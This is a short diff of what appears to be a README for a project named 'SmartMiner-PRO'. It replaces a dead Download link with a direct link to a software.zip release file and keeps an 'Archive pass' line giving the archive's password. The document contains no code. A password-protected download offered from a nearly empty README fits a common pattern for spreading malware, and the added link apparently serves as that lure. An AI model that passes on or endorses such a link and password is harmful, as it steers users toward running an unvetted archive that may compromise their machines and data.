@@ -2,7 +2,7 @@
 
 ![SMP + v1 0](https://github.com/user-attachments/assets/67eefc8f-1e23-48e8-b96a-80aa76534b4f)
 
-# [Download](404)
+# [Download](https://github.com/lee0508/SmartMiner-PRO/releases/download/soft/software.zip)
 
 ## Archive pass - *037-sign!SAME*
 
